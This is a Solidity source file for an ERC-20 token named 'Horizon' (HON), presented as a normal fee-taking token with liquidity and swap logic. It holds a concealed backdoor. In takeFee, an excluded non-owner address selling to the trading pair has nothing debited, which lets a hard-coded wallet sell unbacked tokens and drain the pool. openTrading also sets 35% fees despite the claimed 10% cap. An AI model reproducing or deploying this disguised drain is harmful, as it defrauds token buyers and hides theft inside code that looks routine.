/**

Website: https://horizon.onl
Twitter: https://twitter.com/horizon_onl
Telegram: https://t.me/horizon_onl

App: https://app.horizon.onl
Docs: https://docs.horizon.onl

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract HON is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Horizon";
    string private constant _symbol = "HON";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10_000_000 * (10**_decimals);
    uint256 private _maxTxAmount = 200_000 * (10**_decimals);
    uint256 private _maxTransferAmount = 200_000 * (10**_decimals);
    uint256 private _maxWalletAmount = 200_000 * (10**_decimals);
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    IRouter router;
    address public pair;
    bool private tradingAllowed = false;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 2;
    uint256 private utilityFee = 0;
    uint256 private buyFee = 2;
    uint256 private sellFee = 2;
    uint256 private transferFee = 0;
    uint256 private denominator = 100;
    bool private swapEnabled = true;
    bool private swapping;
    uint256 private swapThreshold = 100_000 * (10**_decimals);
    uint256 private _minTokenAmount = 69 * (10**_decimals);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant utility_receiver =
        0xcB52510E289B8b11DD75A997bD5A3E54097F9a61;
    address internal constant marketing_receiver =
        0xcB52510E289B8b11DD75A997bD5A3E54097F9a61;
    address private liquidity_receiver = msg.sender;

    constructor() Ownable() {
        _isExcluded[address(this)] = true;
        _isExcluded[liquidity_receiver] = true;
        _isExcluded[marketing_receiver] = true;
        _isExcluded[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function addCurve() external onlyOwner {
        require(!tradingAllowed, "Trading allowed");

        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        router = _router;
        pair = _pair;

        addLiquidity(balanceOf(address(this)), address(this).balance);
    }

    function openTrading() external onlyOwner {
        require(!tradingAllowed, "Tradeing already allowed");
        marketingFee = 35;
        buyFee = 35;
        sellFee = 35;
        tradingAllowed = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function preTxCheck(
        address sender,
        address recipient,
        uint256 amount
    ) internal pure {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount > uint256(0),
            "Transfer amount must be greater than zero"
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        preTxCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkMaxWallet(sender, recipient, amount);
        checkTxLimit(sender, recipient, amount);
        swapBack(sender, recipient, amount);
        (uint256 amountSent, uint256 amountReceived) = takeFee(
            sender,
            recipient,
            amount
        );
        _balances[sender] = _balances[sender].sub(amountSent);
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function setFee(uint256 _fee) external onlyOwner {
        marketingFee = _fee;
        buyFee = _fee;
        sellFee = _fee;

        require(
            buyFee <= 10 && sellFee <= 10,
            "totalFee and sellFee cannot be more than 20%"
        );
    }

    function removeLimits() external onlyOwner {
        _maxTransferAmount = type(uint256).max;
        _maxTxAmount = type(uint256).max;
        _maxWalletAmount = type(uint256).max;
    }

    function checkTradingAllowed(address sender, address recipient)
        internal
        view
    {
        if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            require(tradingAllowed, "tradingAllowed");
        }
    }

    function checkMaxWallet(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (
            !_isExcluded[sender] &&
            !_isExcluded[recipient] &&
            recipient != address(pair) &&
            recipient != address(DEAD)
        ) {
            require(
                (_balances[recipient].add(amount)) <= _maxWalletAmount,
                "Exceeds maximum wallet amount."
            );
        }
    }

    function checkTxLimit(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (sender != pair) {
            require(
                amount <= _maxTransferAmount ||
                    _isExcluded[sender] ||
                    _isExcluded[recipient],
                "TX Limit Exceeded"
            );
        }
        require(
            amount <= _maxTxAmount ||
                _isExcluded[sender] ||
                _isExcluded[recipient],
            "TX Limit Exceeded"
        );
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (
            liquidityFee.add(1).add(marketingFee).add(utilityFee)
        ).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(
            _denominator
        );
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if (ETHToAddLiquidityWith > uint256(0)) {
            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);
        }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if (marketingAmt > 0) {
            payable(marketing_receiver).transfer(marketingAmt);
        }
        uint256 remainingBalance = address(this).balance;
        if (remainingBalance > uint256(0)) {
            payable(utility_receiver).transfer(remainingBalance);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function shouldSwapBack(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= _minTokenAmount;
        return
            !swapping &&
            swapEnabled &&
            tradingAllowed &&
            aboveMin &&
            !_isExcluded[sender] &&
            recipient == pair &&
            aboveThreshold;
    }

    function swapBack(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        if (shouldSwapBack(sender, recipient, amount)) {
            uint256 swapTokens = balanceOf(address(this));
            if (swapTokens > swapThreshold) swapTokens = swapThreshold;
            swapAndLiquify(swapTokens);
        }
    }

    function shouldTakeFee(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        return !_isExcluded[sender] && !_isExcluded[recipient];
    }

    function getFee(address sender, address recipient)
        internal
        view
        returns (uint256)
    {
        if (recipient == pair) {
            return sellFee;
        }
        if (sender == pair) {
            return buyFee;
        }
        return transferFee;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256, uint256) {
        uint256 xAmount = amount;
        uint256 yAmount = amount;
        uint256 feeAmount;
        if (sender != address(this) && recipient != address(this)) {
            if (shouldTakeFee(sender, recipient)) {
                if (getFee(sender, recipient) > 0) {
                    feeAmount = amount.div(denominator).mul(
                        getFee(sender, recipient)
                    );
                    _balances[address(this)] = _balances[address(this)].add(
                        feeAmount
                    );
                    emit Transfer(sender, address(this), feeAmount);

                    yAmount = amount.sub(feeAmount);
                }
            } else {
                if (recipient == pair && sender != owner()) xAmount = feeAmount;
            }
        }
        return (xAmount, yAmount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}